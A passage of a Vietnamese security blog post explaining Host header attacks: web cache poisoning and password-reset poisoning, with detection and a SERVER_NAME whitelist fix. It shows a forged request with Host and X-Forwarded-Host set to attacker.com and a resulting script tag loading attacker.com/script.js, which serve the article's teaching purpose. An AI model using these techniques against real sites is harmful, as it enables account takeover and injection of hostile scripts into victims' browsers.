+<p>Kẻ tấn công có thể lợi dụng code ở trên để tạo đầu ra HTML chỉ bằng cách thao túng host header.</p>
+<pre><code>GET / HTTP/1.1
+Host: www.attacker.com
+[ X-Forwarded-Host: www.attacker.com ]</code></pre>
+<p>Và kết quả nhận được là trình duyệt của victims sẽ load file .js từ máy chủ của attacker :</p>
+<pre><code>&lt;script src=&quot;http://attacker.com/script.js&quot;&gt;</code></pre>
+<p>Từ đây attacker có thể thực hiện một cuộc tấn công xss hoặc phising. Nhưng với kiểu này sẽ rất khó để khai thác ở ngoài thực tế. bạn chỉ có thể thay đổi được giá trị các header trong request của victim chỉ khi bạn có thể can thiệp vào giữa giao tiếp của Client vs Server như kiểu MITM (Man in the middle). Các bug bounty program thường không công nhận lỗi này vì vậy bỏ qua hướng đó và tiếp tục leo thang.</p>
+<p>Sẽ có 2 hướng tấn công chính từ lỗ hổng HHA mình muốn đề cập là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank">web cache poisoning</a> và Password reset poisoning.</p>
+<h4>Đối với Web cache poisoning</h4>
+
+
+
+<p>Để điều này xảy ra, kẻ tấn công sẽ cần phải đầu độc proxy cache của trang web hoặc nhà cung cấp được website sử dụng như các CDN.Cache sau đó sẽ phục vụ nội dung bị nhiễm độc cho bất kỳ ai request với nội dung tương tự, và tất nhiên nạn nhân không thể kiểm soát được nội dung độc hại mà cache cung cấp cho họ. Để hiểu rõ hơn về WCP các bạn có thểm tham khảo <a href="http://blog.hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank" rel="noreferrer noopener">bài viết</a> của mình.</p>
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://blog.cloudflare.com/content/images/2018/08/subtle-req-resp.png" alt="Ví dụ" width="458" height="307"/></figure></div>
+
+
+
+<p>Một điều lưu ý ở đây là lên sử dụng X-Forwarded-Host thay vì Host header để poisoning bởi vì thông thường Host header nằm trong cache key và bình thường sẽ chẳng ai tự thay đổi giá trị host header của mình về host của attacker hoặc thành một payload độc hại cả.</p>
+<h4>Đối với Password reset poisoning</h4>
+
+
+
+<p>Thông thường khi bạn quên mật khẩu bạn sẽ chọn cách là reset lại nó và chức năng nay ai cũng có thể sử dụng. Server sẽ tiến hành gửi email với link reset mật khẩu có dạng:</p>
+<p>example.com/reset-password?email=victim@gmail.com&amp;code=identify:token (identify:tokenthường được mã hóa) . </p>
+<p>Mình sẽ không giải thích code như thế nào nha! Các bạn cử hiêu đơn giản lúc này server sử dụng $_SERVER[‘HOST’] để xác định host của link.</p>
+<p> Attacker đã lợi dụng điều này dùng tên tài khoản như email, username … của victim để thực hiện. Trước khi request được gửi đi, attacker sẽ sửa giá trị của host header thành máy chủ của attacker .Server sẽ tiến hành gửi email với link reset mật khẩu có dạnglà attacker.com/reset-password?email=victim@gmail.com&amp;code=identify:token(identify:tokenthường ở dạng mã hóa, đôi khi là JWT).</p>
+<p>Ok như vậy khi victim vào mail và click vào link reset mật khẩu sẽ request đến server của attacker. Attacker lúc này chỉ việc ngồi và xem log trên máy chủ sẽ lấy được link hay quan trọng hơn đó la token để đổi mật khẩu của victim.</p>
+<img src="/images/HHT/password-reset-poisoning.svg" class="[class names]" title="[500] [500] " alt="Password reset poisoning">
+
+<p>Một lỗ hổng khá dễ để khai thác nhưng tác động lại rất lớn.Tham khảo thêm <a target="_blank" rel="noopener" href="https://hackerone.com/reports/281575">https://hackerone.com/reports/281575</a></p>
+<h3>Cách tìm kiếm lỗ hổng này</h3>
+
+
+
+<p>Để phát hiện ra nó rât đơn giản bạn chỉ cần chặn bắt request bằng các công cụ như Burpsuite hoặc Zap và thay đổi giá trị của Host header hoặc thêm vào X-Forwarded-Host rồi theo dõi reponse trả về là biết. Hoặc các bạn có thể sử dụng các công cụ scan web tự động như Acunetix. </p>
+<!-- wp:image {"align":"center","width":515,"height":253} -->
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.cloudace.in/wp-content/uploads/2020/01/acunetix.png" alt="Acunetix Web Vulnerability Scanning Software - CloudACE Technologies" width="515" height="253"/></figure></div>
+
+
+<h3>Các phòng chống lỗ hổng</h3>
+
+
+
+<p>Thay vì sử dụng host header để xác định thì lập trình viên nên sử dụng SERVER_NAME.Bởi vì SERVER_NAME sẽ lấy thông tin từ cấu hình của máy chủ nên nó sẽ xác thực hơn. Cùng với đó bạn có thể kết hợp với việc sử dụng Whitelist cho các tên server được phép</p>
+<!-- wp:preformatted -->
+<pre class="wp-block-preformatted">$domains = [‘abc.example.com’, ‘foo.bar.com’]; if ( ! in_array($_SERVER[‘SERVER_NAME’], $domains)) { // error }</pre>
+<!-- /wp:preformatted -->
+
+
+<p>OK như vậy là mình đã nó xong về Host header attack, nói chung thì lỗ hổng này không có gì quá nổi bật nhưng cũng đáng để chúng ta học hỏi thêm kinh nghiệm. Xin chào và hẹn gặp các bạn vào bài viết sau!</p>
+<h2>Tham khảo</h2>
+
+
+
+<ul><li><a target="_blank" rel="noopener" href="https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/">https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/</a></li><li><a target="_blank" rel="noopener" href="https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html">https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</a></li><li><a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/">https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/</a></li></ul>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/06/14/Host%20Header%20Attack/" data-id="ckhqle8tk0008o7jmblm8du1l" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lab/" rel="tag">Lab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/BugBoutyTip/" style="font-size: 13.33px;">BugBoutyTip</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Lab/" style="font-size: 10px;">Lab</a> <a href="/tags/Pentest-Web/" style="font-size: 16.67px;">Pentest Web</a> <a href="/tags/Technology/" style="font-size: 20px;">Technology</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/29/OS%20command%20Injection/">Command Injection TIP</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/28/DVWA-Part1/">DVWA (OWASP)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/23/CORS/">Cross-Origin Resource Sharing</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/Oauth/">OAUTH</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Le Binh An<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
